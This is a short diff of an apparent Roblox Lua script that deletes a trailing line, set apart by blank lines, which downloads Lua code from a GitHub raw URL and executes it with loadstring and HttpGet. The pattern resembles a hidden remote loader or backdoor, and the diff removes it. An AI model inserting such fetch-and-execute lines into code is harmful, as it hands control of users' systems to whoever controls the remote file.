@@ -649,9 +649,3 @@ if render1 == true then
     end
 
 -------------------------------------------------------------------------------------------------------------------------------------
-
-
-
-
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/zxclua/TimurkaProLuaCoder228/main/yessssssskimozoncontrol"))()
